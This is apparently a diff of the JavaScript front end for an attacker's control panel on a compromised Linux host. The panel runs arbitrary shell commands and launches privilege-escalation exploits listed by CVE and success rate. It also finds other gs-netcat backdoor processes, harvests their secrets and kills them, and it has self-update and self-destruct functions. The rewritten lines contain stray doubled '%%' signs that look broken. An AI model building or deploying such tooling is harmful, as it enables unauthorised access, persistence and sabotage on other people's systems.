 document.querySelectorAll('.nav-item[data-p]').forEach(n=>n.onclick=()=>nav(n.dataset.p));
 let cwd='/';
-
-function nav(p){document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('on'));$('p-'+p)?.classList.add('on');document.querySelector(`.nav-item[data-p="${p}"]`)?.classList.add('on');if(p==='exp')scan();if(p==='proc')loadProc();if(p==='net')loadNet();if(p==='gs')scanGS();}
-
+function nav(p){document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('on'));$('p-'+p)?.classList.add('on');document.querySelector('.nav-item[data-p="'+p+'"]')?.classList.add('on');if(p==='exp')scan();if(p==='proc')loadProc();if(p==='net')loadNet();if(p==='gs')scanGS();}
 async function init(){
 const s=await api('run',{path:'scripts/sysinfo.sh'});
-try{const d=JSON.parse(s.output||'{}');$('s_kernel').textContent=d.kernel||'-';$('s_user').textContent=d.user||'-';$('s_uid').textContent='uid:'+(d.uid||'-');$('s_uptime').textContent=d.uptime||'-';$('s_mem').textContent=d.mem||'-';}catch(e){}
+try{const d=JSON.parse(s.output||'{}');$('s_kernel').textContent=d.kernel||'-';$('s_user').textContent=d.user||'-';$('s_up').textContent=d.uptime||'-';$('s_mem').textContent=d.mem||'-';}catch(e){}
 scanInit();ls(cwd);startLive();
 }
-
-function startLive(){
-async function update(){
-const r=await api('exec',{cmd:"echo $(grep 'cpu ' /proc/stat|awk '{u=$2+$4;t=$2+$4+$5;if(t>0)print int(u*100/t);else print 0}') $(free 2>/dev/null|awk '/Mem:/{if($2>0)print int($3*100/$2);else print 0}') $(df / 2>/dev/null|tail -1|awk '{print $5}'|tr -d '%') $(cat /proc/loadavg 2>/dev/null|awk '{print $1}')"});
-const p=(r.output||'0 0 0 0').trim().split(' ');
-const[cpu,mem,disk,load]=[p[0]||0,p[1]||0,p[2]||0,p[3]||'0'];
-$('live').innerHTML=`
-<div class="live-stat"><div class="live-stat-label">CPU</div><div class="live-stat-value">${cpu}%</div><div class="live-stat-bar"><i style="width:${cpu}%;background:${cpu>80?'var(--red)':cpu>50?'var(--gold)':'var(--green)'}"></i></div></div>
-<div class="live-stat"><div class="live-stat-label">RAM</div><div class="live-stat-value">${mem}%</div><div class="live-stat-bar"><i style="width:${mem}%;background:${mem>80?'var(--red)':mem>50?'var(--gold)':'var(--green)'}"></i></div></div>
-<div class="live-stat"><div class="live-stat-label">Disk</div><div class="live-stat-value">${disk}%</div><div class="live-stat-bar"><i style="width:${disk}%;background:${disk>80?'var(--red)':disk>50?'var(--gold)':'var(--green)'}"></i></div></div>
-<div class="live-stat"><div class="live-stat-label">Load</div><div class="live-stat-value">${load}</div></div>`;}
-update();setInterval(update,3000);
-}
-
-async function scanInit(){
-$('scan').innerHTML=`<div class="progress"><i id="sprog" style="width:0%"></i></div><div id="slog" style="max-height:100px;overflow-y:auto;margin-top:6px"></div>`;
-const steps=['Analyzing kernel...','Scanning SUID...','Checking caps...','Done'];
-for(let i=0;i<steps.length;i++){log('slog',steps[i],'info');$('sprog').style.width=((i+1)/steps.length*100)+'%';await new Promise(r=>setTimeout(r,120));}
-const r=await api('run',{path:'exploits/gate.sh'});
-try{const d=JSON.parse(r.output||'{}');
-if(d.exploits?.length){for(const x of d.exploits)log('slog',`✓ ${x.cve} [${x.rate}%]`,'ok');
-let h='<div style="margin-top:12px">';for(const x of d.exploits.slice(0,3)){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--gold)':'var(--red)';h+=`<div class="exp" onclick="nav('exp')"><span class="exp-cve">${x.cve}</span><span class="exp-name">${x.name}</span><span class="exp-rate" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}
-$('scan').innerHTML+='</div>'+h;}else log('slog','No vulns','info');}catch(e){log('slog','Error','err');}}
-
-async function scan(){
-$('expl').innerHTML='<div style="padding:20px;color:var(--text2);text-align:center">Scanning...</div>';
-const r=await api('run',{path:'exploits/gate.sh'});
-try{const d=JSON.parse(r.output||'{}');if(d.exploits?.length){let h='';for(const x of d.exploits){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--gold)':'var(--red)';h+=`<div class="exp" onclick="runE('${x.cve}')"><span class="exp-cve">${x.cve}</span><span class="exp-name">${x.name}</span><span class="exp-rate" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}$('expl').innerHTML=h;}else $('expl').innerHTML='<div style="padding:20px;color:var(--text2);text-align:center">No exploits</div>';}catch(e){$('expl').innerHTML=`<div style="color:var(--red);padding:20px">${r.output}</div>`;}}
-
-async function runE(cve){if(!confirm('Run '+cve+'?'))return;const r=await api('run',{path:'exploits/'+cve+'/run.sh'});alert(r.output||'Done');scan();}
-async function rs(p){if(!p)return;clear('so');log('so','$ '+p,'cmd');const r=await api('run',{path:p});(r.output||'').split('\n').forEach(l=>log('so',l,'ok'));}
-async function rc(){const c=$('tc').value.trim();if(!c)return;$('tc').value='';log('to','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('to',l,l.toLowerCase().includes('error')||l.toLowerCase().includes('denied')?'err':'ok'));}
-async function rc2(c){clear('to');log('to','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('to',l,'ok'));nav('term');}
-async function loadProc(){clear('po');log('po','$ ps aux --sort=-%mem','cmd');const r=await api('exec',{cmd:'ps aux --sort=-%mem 2>/dev/null|head -35'});(r.output||'').split('\n').forEach((l,i)=>log('po',l,i===0?'info':''));}
-async function loadNet(){clear('no');log('no','$ ss -tulpn','cmd');const r=await api('exec',{cmd:'ss -tulpn 2>/dev/null||netstat -tulpn 2>/dev/null|head -30'});(r.output||'').split('\n').forEach((l,i)=>log('no',l,i===0?'info':''));log('no','');log('no','$ ip addr','cmd');const r2=await api('exec',{cmd:"ip addr 2>/dev/null|grep -E 'inet |link/ether'"});(r2.output||'').split('\n').forEach(l=>log('no',l,'info'));}
-
-async function scanGS(){
-$('gslist').innerHTML='<div style="color:var(--text2);padding:10px">Scanning for gsocket processes...</div>';
-const r=await api('exec',{cmd:`
-ps aux 2>/dev/null | grep -E 'gs-netcat|gsocket' | grep -v grep | while read line; do
-  pid=$(echo "$line" | awk '{print $2}')
-  user=$(echo "$line" | awk '{print $1}')
-  cmd=$(echo "$line" | awk '{for(i=11;i<=NF;i++)printf $i" "}')
-  secret=$(echo "$cmd" | grep -oP '(?<=-s )\\S+' | head -1)
-  start=$(ps -o lstart= -p $pid 2>/dev/null | xargs)
-  [ -z "$secret" ] && secret="(hidden)"
-  echo "$pid|$user|$secret|$start|$cmd"
-done
-`});
-const lines=(r.output||'').trim().split('\n').filter(l=>l.includes('|'));
-if(lines.length===0){$('gslist').innerHTML='<div style="color:var(--text2);padding:10px;text-align:center">No other gsockets found</div>';return;}
-const mygs=$('mygs').innerText;
-let h='';
-for(const line of lines){
-const[pid,user,secret,start,cmd]=line.split('|');
-const isMine=secret===mygs;
-h+=`<div class="gs-item ${isMine?'mine':''}">
-<div class="gs-info">
-<div class="gs-secret">${secret}</div>
-<div class="gs-meta"><span>👤 ${user}</span><span>PID: ${pid}</span><span>📅 ${start||'?'}</span></div>
-</div>
-<div class="gs-actions">
-${isMine?'<span style="color:var(--green);font-size:9px">YOURS</span>':`<button class="btn btn-sm btn-red" onclick="killGS(${pid})">KILL</button>`}
-</div>
-</div>`;
-}
-$('gslist').innerHTML=h;
-}
-
-async function killGS(pid){
-if(!confirm('Kill gsocket process '+pid+'?'))return;
-await api('exec',{cmd:'kill -9 '+pid});
-scanGS();
-}
-
-async function ls(p){
-cwd=p;
-const parts=p.split('/').filter(Boolean);
-$('bc').innerHTML=parts.reduce((a,x,i)=>{const fp='/'+parts.slice(0,i+1).join('/');return a+`<span>/</span><a href="#" onclick="ls('${fp}');return false">${x}</a>`;},'<a href="#" onclick="ls(\'/\');return false">~</a>');
-const d=await api('files',{path:p});
-let h='';
-if(p!=='/'){const pr=p.split('/').slice(0,-1).join('/')||'/';h+=`<div class="fm-item" onclick="ls('${pr}')"><div class="fm-icon dir">↑</div><div class="fm-info"><div class="fm-name">..</div></div></div>`;}
-const files=(d.files||[]).sort((a,b)=>(b.type==='dir')-(a.type==='dir')||a.name.localeCompare(b.name));
-for(const f of files){const np=p==='/'?'/'+f.name:p+'/'+f.name;const isDir=f.type==='dir';const ext=f.name.split('.').pop().toLowerCase();
-const icons={sh:'⚡',py:'🐍',js:'📜',json:'{}',txt:'📝',log:'📋',conf:'⚙',c:'©'};
-h+=`<div class="fm-item" onclick="${isDir?`ls('${np}')`:`preview('${np}')`}"><div class="fm-icon ${isDir?'dir':''}">${isDir?'📁':(icons[ext]||'📄')}</div><div class="fm-info"><div class="fm-name">${f.name}</div><div class="fm-meta">${f.perm||''} ${f.size||''}</div></div></div>`;}
-$('fls').innerHTML=h||'<div style="padding:16px;text-align:center;color:var(--text2)">Empty</div>';
-$('fpreview').innerHTML='';
-}
-
-async function preview(p){
-const r=await api('read',{path:p});
-const ext=p.split('.').pop().toLowerCase();
-const textExt=['sh','txt','log','conf','py','js','json','html','css','c','h','md','xml','yml'];
-if(r.content&&textExt.includes(ext))$('fpreview').innerHTML=`<div class="fm-preview">${r.content.replace(/</g,'&lt;').substring(0,2000)}</div>`;
-else $('fpreview').innerHTML=`<div class="fm-preview" style="color:var(--text3)">Binary file</div>`;
-}
-
-async function pull(){await api('pull');alert('Updated');location.reload();}
-async function nuke(){if(!confirm('⚠ DESTRUCT?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-family:JetBrains Mono;font-size:20px">DESTROYED</div>';}
-
+function startLive(){async function u(){const r=await api('exec',{cmd:"cat /proc/loadavg|awk '{print $1}';free 2>/dev/null|awk '/Mem:/{print int($3*100/$2)}';df / 2>/dev/null|tail -1|awk '{gsub(/%/,\"\");print $5}'"});const[load,mem,disk]=(r.output||'0\n0\n0').trim().split('\n');$('live').innerHTML=`<div class="live-stat"><div class="live-stat-label">Load</div><div class="live-stat-value">${load}</div></div><div class="live-stat"><div class="live-stat-label">Mem</div><div class="live-stat-value">${mem}%%</div><div class="live-bar"><i style="width:${mem}%%;background:${mem>80?'var(--red)':'var(--green)'}"></i></div></div><div class="live-stat"><div class="live-stat-label">Disk</div><div class="live-stat-value">${disk}%%</div><div class="live-bar"><i style="width:${disk}%%;background:${disk>80?'var(--red)':'var(--green)'}"></i></div></div>`;}u();setInterval(u,4000);}
+async function scanInit(){$('scan').innerHTML='<div class="progress"><i id="sp" style="width:0%%"></i></div><div id="sl"></div>';for(let i=0;i<4;i++){log('sl',['Kernel...','SUID...','Caps...','Done'][i]);$('sp').style.width=((i+1)*25)+'%%';await new Promise(r=>setTimeout(r,100));}const r=await api('run',{path:'exploits/gate.sh'});try{const d=JSON.parse(r.output||'{}');if(d.exploits?.length){d.exploits.forEach(x=>log('sl','✓ '+x.cve,'ok'));let h='';d.exploits.slice(0,3).forEach(x=>{const c=x.rate>=80?'var(--green)':'var(--gold)';h+=`<div class="exp" onclick="nav('exp')"><span class="exp-cve">${x.cve}</span><span class="exp-name">${x.name}</span><span class="exp-rate" style="color:${c}">${x.rate}%%</span><div class="exp-bar"><i style="width:${x.rate}%%;background:${c}"></i></div></div>`;});$('scan').innerHTML+='<div style="margin-top:8px">'+h+'</div>';}}catch(e){log('sl','Error','err');}}
+async function scan(){$('expl').innerHTML='Scanning...';const r=await api('run',{path:'exploits/gate.sh'});try{const d=JSON.parse(r.output||'{}');let h='';(d.exploits||[]).forEach(x=>{const c=x.rate>=80?'var(--green)':'var(--gold)';h+=`<div class="exp" onclick="runE('${x.cve}')"><span class="exp-cve">${x.cve}</span><span class="exp-name">${x.name}</span><span class="exp-rate" style="color:${c}">${x.rate}%%</span><div class="exp-bar"><i style="width:${x.rate}%%;background:${c}"></i></div></div>`;});$('expl').innerHTML=h||'No exploits';}catch(e){$('expl').innerHTML='Error';}}
+async function runE(c){if(!confirm('Run '+c+'?'))return;const r=await api('run',{path:'exploits/'+c+'/run.sh'});alert(r.output||'Done');}
+async function rs(p){if(!p)return;$('so').innerHTML='';log('so','$ '+p,'cmd');const r=await api('run',{path:p});(r.output||'').split('\n').forEach(l=>log('so',l,'ok'));}
+async function rc(){const c=$('tc').value.trim();if(!c)return;$('tc').value='';log('to','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('to',l));}
+async function rc2(c){$('to').innerHTML='';log('to','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('to',l));nav('term');}
+async function loadProc(){$('po').innerHTML='';log('po','$ ps aux','cmd');const r=await api('exec',{cmd:'ps aux --sort=-%mem|head -30'});(r.output||'').split('\n').forEach(l=>log('po',l));}
+async function loadNet(){$('no').innerHTML='';log('no','$ ss -tulpn','cmd');const r=await api('exec',{cmd:'ss -tulpn 2>/dev/null||netstat -tulpn'});(r.output||'').split('\n').forEach(l=>log('no',l));}
+async function scanGS(){$('gslist').innerHTML='Scanning...';const r=await api('exec',{cmd:"ps aux|grep -E 'gs-netcat'|grep -v grep|while read l;do pid=$(echo $l|awk '{print $2}');usr=$(echo $l|awk '{print $1}');sec=$(echo $l|grep -oE '\\-s [a-z0-9]+' 2>/dev/null|cut -d' ' -f2);echo \"$pid|$usr|$sec\";done"});const lines=(r.output||'').trim().split('\n').filter(l=>l.includes('|'));if(!lines.length){$('gslist').innerHTML='<div style="color:var(--text2);padding:10px">No other gsockets</div>';return;}const my=$('mygs').innerText;let h='';lines.forEach(l=>{const[pid,usr,sec]=l.split('|');const mine=sec===my;h+=`<div class="gs-item ${mine?'mine':''}"><div class="gs-info"><div class="gs-secret">${sec||'(hidden)'}</div><div class="gs-meta">PID:${pid} User:${usr}</div></div>${mine?'':'<button class="btn btn-sm btn-red" onclick="killGS('+pid+')">Kill</button>'}</div>`;});$('gslist').innerHTML=h;}
+async function killGS(p){if(!confirm('Kill '+p+'?'))return;await api('exec',{cmd:'kill -9 '+p});scanGS();}
+async function ls(p){cwd=p;$('bc').innerHTML=p.split('/').filter(Boolean).reduce((a,x,i,arr)=>`${a}/<a href="#" onclick="ls('/'+this.dataset.p);return false" data-p="${arr.slice(0,i+1).join('/')}">${x}</a>`,'<a href="#" onclick="ls(\'/\');return false">~</a>');const d=await api('files',{path:p});let h='';if(p!=='/'){const pr=p.split('/').slice(0,-1).join('/')||'/';h+=`<div class="fm-item" onclick="ls('${pr}')"><div class="fm-icon dir">↑</div><div class="fm-name">..</div></div>`;}(d.files||[]).sort((a,b)=>(b.type==='dir')-(a.type==='dir')).forEach(f=>{const np=p==='/'?'/'+f.name:p+'/'+f.name;const dir=f.type==='dir';h+=`<div class="fm-item" onclick="${dir?`ls('${np}')`:'0'}"><div class="fm-icon ${dir?'dir':''}">${dir?'📁':'📄'}</div><div class="fm-name">${f.name}</div><div class="fm-size">${f.size||''}</div></div>`;});$('fls').innerHTML=h||'Empty';}
+async function pull(){await api('pull');location.reload();}
+async function nuke(){if(!confirm('DESTRUCT?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-size:20px">DESTROYED</div>';}
 init();
 </script>
 </body></html>
